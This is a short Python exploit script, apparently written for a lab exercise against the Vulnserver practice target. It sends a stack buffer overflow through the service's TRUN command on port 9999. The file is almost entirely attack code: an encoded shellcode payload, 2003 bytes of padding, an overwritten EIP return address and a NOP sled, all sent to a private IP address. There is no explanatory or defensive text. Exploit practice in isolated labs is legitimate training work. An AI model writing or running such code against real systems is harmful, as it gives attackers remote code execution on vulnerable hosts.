#!/usr/bin/python3
import sys, socket      # importing modules
from time import sleep  # importing time from module sleep
buf =  b""
buf += b"\xda\xcd\xb8\xbc\x19\xfa\x41\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x52\x83\xea\xfc\x31\x42\x13\x03\xfe\x0a\x18"
buf += b"\xb4\x02\xc4\x5e\x37\xfa\x15\x3f\xb1\x1f\x24\x7f\xa5"
buf += b"\x54\x17\x4f\xad\x38\x94\x24\xe3\xa8\x2f\x48\x2c\xdf"
buf += b"\x98\xe7\x0a\xee\x19\x5b\x6e\x71\x9a\xa6\xa3\x51\xa3"
buf += b"\x68\xb6\x90\xe4\x95\x3b\xc0\xbd\xd2\xee\xf4\xca\xaf"
buf += b"\x32\x7f\x80\x3e\x33\x9c\x51\x40\x12\x33\xe9\x1b\xb4"
buf += b"\xb2\x3e\x10\xfd\xac\x23\x1d\xb7\x47\x97\xe9\x46\x81"
buf += b"\xe9\x12\xe4\xec\xc5\xe0\xf4\x29\xe1\x1a\x83\x43\x11"
buf += b"\xa6\x94\x90\x6b\x7c\x10\x02\xcb\xf7\x82\xee\xed\xd4"
buf += b"\x55\x65\xe1\x91\x12\x21\xe6\x24\xf6\x5a\x12\xac\xf9"
buf += b"\x8c\x92\xf6\xdd\x08\xfe\xad\x7c\x09\x5a\x03\x80\x49"
buf += b"\x05\xfc\x24\x02\xa8\xe9\x54\x49\xa5\xde\x54\x71\x35"
buf += b"\x49\xee\x02\x07\xd6\x44\x8c\x2b\x9f\x42\x4b\x4b\x8a"
buf += b"\x33\xc3\xb2\x35\x44\xca\x70\x61\x14\x64\x50\x0a\xff"
buf += b"\x74\x5d\xdf\x50\x24\xf1\xb0\x10\x94\xb1\x60\xf9\xfe"
buf += b"\x3d\x5e\x19\x01\x94\xf7\xb0\xf8\x7f\x38\xec\x17\x13"
buf += b"\xd0\xef\x17\x31\x99\x79\xf1\x5f\xc9\x2f\xaa\xf7\x70"
buf += b"\x6a\x20\x69\x7c\xa0\x4d\xa9\xf6\x47\xb2\x64\xff\x22"
buf += b"\xa0\x11\x0f\x79\x9a\xb4\x10\x57\xb2\x5b\x82\x3c\x42"
buf += b"\x15\xbf\xea\x15\x72\x71\xe3\xf3\x6e\x28\x5d\xe1\x72"
buf += b"\xac\xa6\xa1\xa8\x0d\x28\x28\x3c\x29\x0e\x3a\xf8\xb2"
buf += b"\x0a\x6e\x54\xe5\xc4\xd8\x12\x5f\xa7\xb2\xcc\x0c\x61"
buf += b"\x52\x88\x7e\xb2\x24\x95\xaa\x44\xc8\x24\x03\x11\xf7"
buf += b"\x89\xc3\x95\x80\xf7\x73\x59\x5b\xbc\x94\xb8\x49\xc9"
buf += b"\x3c\x65\x18\x70\x21\x96\xf7\xb7\x5c\x15\xfd\x47\x9b"
buf += b"\x05\x74\x4d\xe7\x81\x65\x3f\x78\x64\x89\xec\x79\xad"

payload = "A"*2003;
eip = b"\xaf\x11\x50\x62";
nop = b"\x90"*20;
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
    s.connect(("192.168.21.148",9999));
    s.send((("TRUN /.:/" + payload).encode() + eip + nop + buf));
    s.close();
except:
    print("Error in connecting");
    sys.exit();

